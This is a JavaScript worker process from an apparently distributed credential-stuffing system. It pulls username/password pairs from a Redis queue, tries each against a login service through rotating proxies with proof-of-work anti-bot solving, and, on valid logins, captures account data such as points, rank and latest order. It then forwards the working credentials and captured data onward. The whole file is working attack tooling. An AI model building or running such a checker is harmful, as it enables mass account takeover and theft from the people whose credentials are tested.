/**
 * Worker Node - Standalone Process for Distributed Credential Checking
 * 
 * Pulls tasks from Redis queue, executes credential checks, and publishes results.
 * Designed to run as independent processes across multiple EC2 instances.
 * 
 * Requirements: 2.1, 2.2, 2.3, 2.4, 2.5, 1.6, 5.7, 5.8, 7.3, 8.1
 */

const { createLogger } = require('../../logger');
const { createStructuredLogger } = require('../logger/structured');
const { checkCredentials } = require('../../httpChecker');
const { captureAccountData } = require('../../automation/http/httpDataCapture');
const { fetchIpInfo } = require('../../automation/http/ipFetcher');
const powServiceClient = require('../../automation/http/fingerprinting/powServiceClient');
const { 
  JOB_QUEUE, 
  TASK_LEASE, 
  RESULT_CACHE, 
  PROGRESS_TRACKER,
  WORKER_HEARTBEAT,
  PUBSUB_CHANNELS,
  generateWorkerId 
} = require('../redis/keys');

const log = createLogger('worker-node');
const structuredLog = createStructuredLogger('worker-node');

class WorkerNode {
  constructor(redisClient, options = {}) {
    this.redis = redisClient;
    this.workerId = options.workerId || generateWorkerId();
    this.powServiceUrl = options.powServiceUrl || process.env.POW_SERVICE_URL;
    
    // Worker state
    this.currentTask = null;
    this.shutdown = false;
    this.isProcessing = false;
    this.tasksCompleted = 0;
    this.startTime = Date.now();
    
    // Timeouts and intervals
    this.taskTimeout = options.taskTimeout || 120000; // 2 minutes max per task
    this.heartbeatInterval = options.heartbeatInterval || 10000; // 10 seconds
    this.queueTimeout = options.queueTimeout || 30000; // 30 seconds BLPOP timeout
    
    // Intervals
    this.heartbeatTimer = null;
    
    log.info(`Worker node initialized`, {
      workerId: this.workerId,
      powServiceUrl: this.powServiceUrl,
      taskTimeout: this.taskTimeout,
      heartbeatInterval: this.heartbeatInterval
    });
  }

  /**
   * Main worker loop - continuously pull and process tasks
   */
  async run() {
    log.info(`Worker ${this.workerId} starting up`);
    
    try {
      // 1. Register worker with unique ID in Redis
      await this.registerWorker();
      
      // 2. Start heartbeat interval (10s)
      this.startHeartbeat();
      
      // 3. Main processing loop
      while (!this.shutdown) {
        try {
          // BLPOP task from queue with timeout
          const task = await this.dequeueTask();
          
          if (task) {
            await this.processTaskWithLease(task);
          }
          
          // Small delay to prevent busy waiting
          if (!this.shutdown) {
            await this.sleep(100);
          }
          
        } catch (error) {
          log.error('Error in worker main loop', {
            workerId: this.workerId,
            error: error.message
          });
          
          // Continue processing unless it's a fatal error
          if (this.isFatalError(error)) {
            log.error('Fatal error detected, shutting down worker', {
              workerId: this.workerId,
              error: error.message
            });
            break;
          }
          
          // For timeout errors, continue immediately (no extra delay)
          if (error.message.includes('Command timed out') || 
              error.message.includes('timeout')) {
            log.debug('Timeout error in main loop, continuing', {
              workerId: this.workerId
            });
            continue;
          }
          
          // Wait before retrying on other errors
          await this.sleep(5000);
        }
      }
      
    } catch (error) {
      log.error('Worker startup failed', {
        workerId: this.workerId,
        error: error.message
      });
      throw error;
    } finally {
      await this.cleanup();
    }
    
    log.info(`Worker ${this.workerId} shut down complete`);
  }

  /**
   * Register worker with Redis
   */
  async registerWorker() {
    try {
      const registrationData = {
        workerId: this.workerId,
        startTime: this.startTime,
        pid: process.pid,
        hostname: process.env.HOSTNAME || 'unknown',
        version: process.env.npm_package_version || '1.0.0'
      };
      
      // Store worker registration (no TTL - cleaned up on shutdown)
      await this.redis.executeCommand(
        'set',
        `worker:${this.workerId}:info`,
        JSON.stringify(registrationData)
      );
      
      log.info(`Worker ${this.workerId} registered successfully`, registrationData);
    } catch (error) {
      log.error('Failed to register worker', {
        workerId: this.workerId,
        error: error.message
      });
      throw error;
    }
  }

  /**
   * Dequeue task from Redis with priority (retry queue first, then main queue)
   * @returns {Promise<Object|null>} Task object or null if timeout
   */
  async dequeueTask() {
    try {
      // Try retry queue first (high priority) with 1s timeout
      let result = await this.redis.executeCommand('blpop', JOB_QUEUE.retry, 1);
      
      if (result) {
        const taskJson = result[1];
        const task = JSON.parse(taskJson);
        log.debug(`Dequeued retry task ${task.taskId}`, {
          workerId: this.workerId,
          taskId: task.taskId,
          batchId: task.batchId,
          retryCount: task.retryCount
        });
        return task;
      }
      
      // If no retry tasks, pull from main queue with longer timeout
      result = await this.redis.executeCommand('blpop', JOB_QUEUE.tasks, this.queueTimeout / 1000);
      
      if (result) {
        const taskJson = result[1];
        const task = JSON.parse(taskJson);
        log.debug(`Dequeued main task ${task.taskId}`, {
          workerId: this.workerId,
          taskId: task.taskId,
          batchId: task.batchId
        });
        return task;
      }
      
      // Timeout - no tasks available
      return null;
      
    } catch (error) {
      // Handle timeout errors gracefully
      if (error.message.includes('Command timed out') || 
          error.message.includes('timeout')) {
        log.debug('BLPOP timeout - no tasks available', {
          workerId: this.workerId,
          timeout: this.queueTimeout
        });
        return null;
      }
      
      if (error.message.includes('BLPOP') && this.shutdown) {
        // Expected during shutdown
        return null;
      }
      
      log.error('Error dequeuing task', {
        workerId: this.workerId,
        error: error.message
      });
      throw error;
    }
  }

  /**
   * Process task with lease management
   * @param {Object} task - Task object from queue
   */
  async processTaskWithLease(task) {
    const leaseKey = TASK_LEASE.generate(task.batchId, task.taskId);
    let leaseAcquired = false;
    
    try {
      // Acquire task lease: SET with TTL and NX (only if not exists)
      const leaseValue = JSON.stringify({
        workerId: this.workerId,
        acquiredAt: Date.now(),
        task: task
      });
      
      const acquired = await this.redis.executeCommand(
        'set',
        leaseKey,
        leaseValue,
        'EX',
        TASK_LEASE.ttl,
        'NX'
      );
      
      if (!acquired) {
        log.warn(`Task ${task.taskId} already has active lease, skipping`, {
          workerId: this.workerId,
          taskId: task.taskId,
          batchId: task.batchId
        });
        return;
      }
      
      leaseAcquired = true;
      this.currentTask = task;
      
      log.info(`Processing task ${task.taskId}`, {
        workerId: this.workerId,
        taskId: task.taskId,
        batchId: task.batchId,
        username: task.username,
        proxyId: task.proxyId,
        retryCount: task.retryCount || 0
      });
      
      // Process the task with timeout
      await this.processTaskWithTimeout(task);
      
    } catch (error) {
      log.error(`Task ${task.taskId} processing failed`, {
        workerId: this.workerId,
        taskId: task.taskId,
        error: error.message
      });
      
      // Task failed - will be retried by coordinator if within retry limit
      // Don't re-enqueue here, let the lease expire and zombie recovery handle it
      
    } finally {
      // Release lease after completion
      if (leaseAcquired) {
        try {
          await this.redis.executeCommand('del', leaseKey);
          log.debug(`Released lease for task ${task.taskId}`, {
            workerId: this.workerId,
            taskId: task.taskId
          });
        } catch (error) {
          log.warn(`Failed to release lease for task ${task.taskId}`, {
            workerId: this.workerId,
            taskId: task.taskId,
            error: error.message
          });
        }
      }
      
      this.currentTask = null;
      this.tasksCompleted++;
    }
  }

  /**
   * Process task with timeout wrapper
   * @param {Object} task - Task to process
   */
  async processTaskWithTimeout(task) {
    return new Promise((resolve, reject) => {
      const timeoutId = setTimeout(() => {
        reject(new Error(`Task ${task.taskId} timed out after ${this.taskTimeout}ms`));
      }, this.taskTimeout);
      
      this.processTask(task)
        .then(resolve)
        .catch(reject)
        .finally(() => {
          clearTimeout(timeoutId);
        });
    });
  }

  /**
   * Process a single credential check task
   * @param {Object} task - Task object with credential, proxy, metadata
   * @returns {Promise<Object>} - Result object with status, capture, IP
   */
  async processTask(task) {
    const startTime = Date.now();
    
    try {
      // Extract credential, proxy, batchId from task
      const { username, password, proxyUrl, batchId, taskId } = task;
      
      log.debug(`Starting credential check for ${username}`, {
        workerId: this.workerId,
        taskId,
        batchId,
        proxyUrl: proxyUrl ? 'configured' : 'none'
      });
      
      // Request cres from POW service (with fallback)
      // Note: POW service integration is handled internally by httpChecker.js
      // which uses powServiceClient for cres computation with automatic fallback
      
      // Execute credential check via existing httpChecker.js with assigned proxy
      const checkResult = await checkCredentials(username, password, {
        proxy: proxyUrl,
        timeoutMs: 60000,
        deferCloseOnValid: true, // Keep session open for data capture
        batchMode: true
      });
      
      let result = {
        username,
        password,
        status: checkResult.status,
        checkedAt: Date.now(),
        workerId: this.workerId,
        proxyId: task.proxyId,
        checkDurationMs: Date.now() - startTime,
        batchId,
        taskId
      };
      
      // If VALID, fetch exit IP and capture account data
      if (checkResult.status === 'VALID') {
        await this.handleValidCredential(checkResult, result, task);
      } else {
        // For non-VALID results, add error details if available
        if (checkResult.message) {
          result.errorCode = checkResult.message;
        }
      }
      
      // Store result in Result_Store with 30-day TTL
      await this.storeResult(result);
      
      // Increment progress counter
      await this.incrementProgress(batchId);
      
      // Publish events for coordinator
      await this.publishResultEvents(result, checkResult);
      
      // Log structured task completion
      structuredLog.logTaskCompletion({
        taskId: result.taskId,
        batchId: result.batchId,
        username: result.username,
        status: result.status,
        duration: result.checkDurationMs,
        proxyId: result.proxyId,
        workerId: result.workerId,
        errorCode: result.errorCode,
        ipAddress: result.ipAddress
      });
      
      log.info(`Task ${taskId} completed: ${result.status}`, {
        workerId: this.workerId,
        taskId,
        batchId,
        status: result.status,
        duration: result.checkDurationMs,
        ipAddress: result.ipAddress || 'none'
      });
      
      return result;
      
    } catch (error) {
      const duration = Date.now() - startTime;
      
      // Log structured error
      structuredLog.logError(`Task ${task.taskId} failed`, error, {
        workerId: this.workerId,
        taskId: task.taskId,
        batchId: task.batchId,
        duration
      });
      
      log.error(`Task ${task.taskId} failed`, {
        workerId: this.workerId,
        taskId: task.taskId,
        batchId: task.batchId,
        error: error.message,
        duration
      });
      
      // Create error result
      const errorResult = {
        username: task.username,
        password: task.password,
        status: 'ERROR',
        errorCode: error.message,
        checkedAt: Date.now(),
        workerId: this.workerId,
        proxyId: task.proxyId,
        checkDurationMs: duration,
        batchId: task.batchId,
        taskId: task.taskId
      };
      
      // Store error result
      await this.storeResult(errorResult);
      
      // Increment progress counter (errors count as completed)
      await this.incrementProgress(task.batchId);
      
      // Log structured task completion for error
      structuredLog.logTaskCompletion({
        taskId: errorResult.taskId,
        batchId: errorResult.batchId,
        username: errorResult.username,
        status: errorResult.status,
        duration: errorResult.checkDurationMs,
        proxyId: errorResult.proxyId,
        workerId: errorResult.workerId,
        errorCode: errorResult.errorCode
      });
      
      throw error;
    }
  }

  /**
   * Handle VALID credential - fetch IP and capture data
   * @param {Object} checkResult - Result from httpChecker
   * @param {Object} result - Result object being built
   * @param {Object} task - Original task
   */
  async handleValidCredential(checkResult, result, task) {
    try {
      // If IP was already fetched during check, use it
      if (checkResult.ipAddress) {
        result.ipAddress = checkResult.ipAddress;
        log.debug(`IP address from check: ${checkResult.ipAddress}`, {
          workerId: this.workerId,
          taskId: task.taskId
        });
      } else if (task.proxyUrl && checkResult.session) {
        // Fetch exit IP for VALID credentials via ipFetcher.js
        log.debug('Fetching exit IP for VALID credential', {
          workerId: this.workerId,
          taskId: task.taskId
        });
        
        const ipInfo = await fetchIpInfo(checkResult.session.client, 10000);
        if (ipInfo.ip) {
          result.ipAddress = ipInfo.ip;
          log.debug(`Exit IP fetched: ${ipInfo.ip}`, {
            workerId: this.workerId,
            taskId: task.taskId
          });
        }
      }
      
      // Capture account data for VALID via httpDataCapture.js
      if (checkResult.session) {
        log.debug('Capturing account data for VALID credential', {
          workerId: this.workerId,
          taskId: task.taskId
        });
        
        const captureData = await captureAccountData(checkResult.session, {
          timeoutMs: 30000
        });
        
        result.capture = captureData;
        
        log.debug('Account data captured', {
          workerId: this.workerId,
          taskId: task.taskId,
          points: captureData.points,
          rank: captureData.rank,
          latestOrder: captureData.latestOrder
        });
        
        // Close session after capture
        if (checkResult.session.client) {
          try {
            checkResult.session.client.defaults.jar.removeAllCookies();
          } catch (e) {
            // Ignore cleanup errors
          }
        }
      }
      
    } catch (error) {
      log.warn(`Failed to capture additional data for VALID credential`, {
        workerId: this.workerId,
        taskId: task.taskId,
        error: error.message
      });
      
      // Don't fail the task if IP/capture fails - credential is still VALID
      result.captureError = error.message;
    }
  }

  /**
   * Store result in Redis Result_Store
   * @param {Object} result - Result object to store
   */
  async storeResult(result) {
    try {
      const resultKey = RESULT_CACHE.generate(result.status, result.username, result.password);
      const resultData = JSON.stringify(result);
      
      await this.redis.executeCommand(
        'setex',
        resultKey,
        RESULT_CACHE.ttl,
        resultData
      );
      
      log.debug(`Stored result in cache`, {
        workerId: this.workerId,
        resultKey,
        status: result.status
      });
      
    } catch (error) {
      log.error('Failed to store result in cache', {
        workerId: this.workerId,
        taskId: result.taskId,
        error: error.message
      });
      // Don't throw - result storage failure shouldn't fail the task
    }
  }

  /**
   * Increment progress counter for batch
   * @param {string} batchId - Batch identifier
   */
  async incrementProgress(batchId) {
    try {
      const counterKey = PROGRESS_TRACKER.generateCounter(batchId);
      await this.redis.executeCommand('incr', counterKey);
      
      log.debug(`Incremented progress for batch ${batchId}`, {
        workerId: this.workerId,
        batchId
      });
      
    } catch (error) {
      log.error('Failed to increment progress counter', {
        workerId: this.workerId,
        batchId,
        error: error.message
      });
      // Don't throw - progress tracking failure shouldn't fail the task
    }
  }

  /**
   * Publish result events to Redis pub/sub for coordinator
   * @param {Object} result - Result object
   * @param {Object} checkResult - Original check result
   */
  async publishResultEvents(result, checkResult) {
    try {
      // If VALID, publish forward_event
      if (result.status === 'VALID' && result.capture) {
        const forwardEvent = {
          username: result.username,
          password: result.password,
          capture: result.capture,
          ipAddress: result.ipAddress,
          timestamp: result.checkedAt,
          workerId: this.workerId,
          batchId: result.batchId
        };
        
        await this.redis.executeCommand(
          'publish',
          PUBSUB_CHANNELS.forwardEvents,
          JSON.stringify(forwardEvent)
        );
        
        log.debug('Published forward_event', {
          workerId: this.workerId,
          username: result.username,
          batchId: result.batchId
        });
      }
      
      // If status changed (recheck), publish update_event
      // Note: For now, we don't track previous status, so this is for future enhancement
      
    } catch (error) {
      log.error('Failed to publish result events', {
        workerId: this.workerId,
        taskId: result.taskId,
        error: error.message
      });
      // Don't throw - event publishing failure shouldn't fail the task
    }
  }

  /**
   * Check if error is fatal (should cause worker shutdown)
   * @param {Error} error - Error to check
   * @returns {boolean} True if fatal
   */
  isFatalError(error) {
    // Timeout errors are not fatal - they're expected during normal operation
    if (error.message.includes('Command timed out') || 
        error.message.includes('timeout')) {
      return false;
    }
    
    // Redis connection errors are fatal
    if (error.message.includes('Connection is closed') ||
        error.message.includes('ECONNREFUSED') ||
        error.message.includes('ENOTFOUND') ||
        error.message.includes('Redis connection')) {
      return true;
    }
    
    return false;
  }

  /**
   * Sleep utility
   * @param {number} ms - Milliseconds to sleep
   * @returns {Promise<void>}
   */
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * Start heartbeat mechanism
   */
  startHeartbeat() {
    this.heartbeatTimer = setInterval(async () => {
      await this.sendHeartbeat();
    }, this.heartbeatInterval);
    
    log.debug(`Heartbeat started (${this.heartbeatInterval}ms interval)`, {
      workerId: this.workerId
    });
  }

  /**
   * Send heartbeat to coordinator
   */
  async sendHeartbeat() {
    try {
      const heartbeatData = {
        workerId: this.workerId,
        timestamp: Date.now(),
        tasksCompleted: this.tasksCompleted,
        isProcessing: this.isProcessing,
        currentTask: this.currentTask ? {
          taskId: this.currentTask.taskId,
          batchId: this.currentTask.batchId,
          startedAt: this.currentTask.startedAt
        } : null,
        uptime: Date.now() - this.startTime,
        memoryUsage: process.memoryUsage()
      };
      
      // Use Promise.race to add additional timeout protection for heartbeat
      const heartbeatTimeout = 30000; // 30 second timeout for heartbeat operations
      
      await Promise.race([
        this.sendHeartbeatCommands(heartbeatData),
        new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Heartbeat timeout')), heartbeatTimeout)
        )
      ]);
      
      // Log structured heartbeat
      structuredLog.logWorkerHeartbeat(heartbeatData);
      
      log.debug('Heartbeat sent', {
        workerId: this.workerId,
        tasksCompleted: this.tasksCompleted,
        uptime: heartbeatData.uptime
      });
      
    } catch (error) {
      // Heartbeat timeouts are expected under load - log as warning, not error
      const isTimeout = error.message.includes('timeout');
      const logLevel = isTimeout ? 'warn' : 'error';
      
      if (!isTimeout) {
        structuredLog.logError('Failed to send heartbeat', error, {
          workerId: this.workerId
        });
      }
      
      log[logLevel]('Failed to send heartbeat', {
        workerId: this.workerId,
        error: error.message
      });
      
      // Don't treat heartbeat timeouts as fatal - they're expected under load
      if (!isTimeout && this.isFatalError(error)) {
        log.error('Heartbeat failure indicates fatal error, initiating shutdown', {
          workerId: this.workerId
        });
        this.shutdown = true;
      }
    }
  }

  /**
   * Execute heartbeat Redis commands
   * @param {Object} heartbeatData - Heartbeat data to send
   */
  async sendHeartbeatCommands(heartbeatData) {
    // SET worker heartbeat with TTL
    await this.redis.executeCommand(
      'setex',
      WORKER_HEARTBEAT.generate(this.workerId),
      WORKER_HEARTBEAT.ttl,
      JSON.stringify(heartbeatData)
    );
    
    // PUBLISH to worker_heartbeats channel
    await this.redis.executeCommand(
      'publish',
      PUBSUB_CHANNELS.workerHeartbeats,
      JSON.stringify(heartbeatData)
    );
  }

  /**
   * Handle graceful shutdown
   */
  async handleShutdown(signal = 'SIGTERM') {
    log.info(`Worker ${this.workerId} received ${signal}, initiating graceful shutdown`);
    
    // 1. Stop pulling new tasks immediately
    this.shutdown = true;
    
    // 2. If currentTask exists, wait up to 2 minutes for completion
    if (this.currentTask) {
      log.info(`Waiting for current task ${this.currentTask.taskId} to complete`, {
        workerId: this.workerId,
        taskId: this.currentTask.taskId,
        maxWait: this.taskTimeout
      });
      
      const startWait = Date.now();
      while (this.currentTask && (Date.now() - startWait) < this.taskTimeout) {
        await this.sleep(1000);
      }
      
      // 3. If timeout exceeded, release task lease and log incomplete task
      if (this.currentTask) {
        const leaseKey = TASK_LEASE.generate(this.currentTask.batchId, this.currentTask.taskId);
        
        try {
          await this.redis.executeCommand('del', leaseKey);
          log.warn(`Released lease for incomplete task ${this.currentTask.taskId}`, {
            workerId: this.workerId,
            taskId: this.currentTask.taskId,
            batchId: this.currentTask.batchId
          });
        } catch (error) {
          log.error('Failed to release lease for incomplete task', {
            workerId: this.workerId,
            taskId: this.currentTask.taskId,
            error: error.message
          });
        }
        
        // 4. Log incomplete task ID
        log.warn(`Task ${this.currentTask.taskId} incomplete at shutdown`, {
          workerId: this.workerId,
          taskId: this.currentTask.taskId,
          batchId: this.currentTask.batchId
        });
      }
    }
    
    await this.cleanup();
    
    // 5. Exit with code 0 for systemd restart
    log.info(`Worker ${this.workerId} graceful shutdown complete`);
    process.exit(0);
  }

  /**
   * Cleanup resources
   */
  async cleanup() {
    // Stop heartbeat
    if (this.heartbeatTimer) {
      clearInterval(this.heartbeatTimer);
      this.heartbeatTimer = null;
    }
    
    // Clean up worker registration
    try {
      await this.redis.executeCommand('del', `worker:${this.workerId}:info`);
      await this.redis.executeCommand('del', WORKER_HEARTBEAT.generate(this.workerId));
      
      log.debug(`Cleaned up worker registration for ${this.workerId}`);
    } catch (error) {
      log.warn('Failed to clean up worker registration', {
        workerId: this.workerId,
        error: error.message
      });
    }
  }
}

module.exports = WorkerNode;